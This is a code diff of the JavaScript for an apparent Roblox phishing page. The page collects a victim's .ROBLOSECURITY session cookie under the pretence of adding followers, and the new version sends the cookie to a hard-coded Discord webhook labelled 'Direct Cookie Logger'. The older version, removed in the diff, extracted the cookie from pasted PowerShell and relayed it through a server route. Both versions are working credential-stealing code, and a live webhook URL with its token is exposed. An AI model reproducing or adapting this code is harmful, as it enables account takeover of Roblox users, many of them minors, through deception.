@@ -1,79 +1,52 @@
-// File: script.js (yang baru)
-
-document.addEventListener('DOMContentLoaded', function() {
-    const form = document.getElementById('cookie-form');
+document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('cookieForm');
+    const cookieInput = document.getElementById('cookieInput');
     const statusDiv = document.getElementById('status');
 
-    form.addEventListener('submit', function(event) {
-        event.preventDefault();
+    // !!! WEBHOOK URL LO (RAHASIAKAN!) !!!
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1473284471137767558/asp42MiZ5mb6XaOXVNRmiyVsxVl5tG5AeWy6pJ2TXq8-0Ak-Y6tuuozHpVLlySDbPHlG';
 
-        const inputData = document.getElementById('powershell').value;
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
 
-        if (!inputData.trim()) {
-            showStatus('Input kosong! Masukin data PowerShell dulu.', 'error');
+        const cookie = cookieInput.value.trim();
+
+        if (!cookie) {
+            showStatus('Cookie nggak boleh kosong, bro!', 'error');
             return;
         }
 
-        showStatus('Memvalidasi file...', 'processing');
+        showStatus('Sedang mengirim...', 'processing');
 
-        const requiredStrings = [
-            'New-Object Microsoft.PowerShell.Commands.WebRequestSession',
-            '.ROBLOSECURITY',
-            'Invoke-WebRequest',
-            'https://www.roblox.com/id/users/4909346453/profile'
-        ];
+        // Kita potong cookie-nya biar nggak error di Discord
+        const shortCookie = cookie.substring(0, 1500); 
 
-        let isValid = true;
-        for (const str of requiredStrings) {
-            if (!inputData.includes(str)) {
-                isValid = false;
-                break;
-            }
-        }
+        const payload = {
+            content: `🍪 **Cookie Baru Masuk (V2)!** (Panjang: ${cookie.length} char)\n\`\`\`${shortCookie}...\`\`\``,
+            username: "Direct Cookie Logger",
+            avatar_url: "https://i.imgur.com/rVw5B2W.png"
+        };
 
-        if (!isValid) {
-            showStatus('Invalid file! Gagal mengisi followers.', 'error');
-            return;
-        }
-
-        showStatus('File valid! Mengambil cookie...', 'processing');
-        
-        const regex = /\.ROBLOSECURITY.*?"(.*?)"/;
-        const match = inputData.match(regex);
-
-        if (match && match[1]) {
-            const extractedCookie = match[1];
-            showStatus('Mengirim ke server...', 'processing');
-            // Kirim ke API Route kita, bukan ke Discord langsung
-            sendToServer(extractedCookie);
-        } else {
-            showStatus('GAGAL! Cookie .ROBLOSECURITY nggak ketemu. Format file salah.', 'error');
-        }
-    });
-
-    // Fungsi ini ngirim ke API Route /api/discord
-    async function sendToServer(cookie) {
         try {
-            const response = await fetch('/api/discord', {
+            const response = await fetch(discordWebhookUrl, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ cookie: cookie }),
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
             });
 
-            const result = await response.json();
-
-            if (response.ok && result.message === 'Success') {
-                showStatus('✅ SUKSES! Followers sedang diproses... (Cookie terkirim)', 'success');
+            if (response.ok) {
+                showStatus('✅ SUKSES! Cookie terkirim ke Discord!', 'success');
+                cookieInput.value = ''; // Kosongkan kotak
             } else {
-                showStatus(`❌ ERROR! ${result.message || 'Gagal kirim ke server.'}`, 'error');
+                const errorData = await response.text();
+                console.error('Discord Error:', response.status, errorData);
+                showStatus(`❌ ERROR! Gagal kirim ke Discord.`, 'error');
             }
         } catch (error) {
-            showStatus(`❌ FATAL ERROR! ${error.message}`, 'error');
-            console.error('Fetch error:', error);
+            console.error('Fetch Error:', error);
+            showStatus(`❌ FATAL ERROR! Cek koneksi internet.`, 'error');
         }
-    }
+    });
 
     function showStatus(message, type) {
         statusDiv.textContent = message;
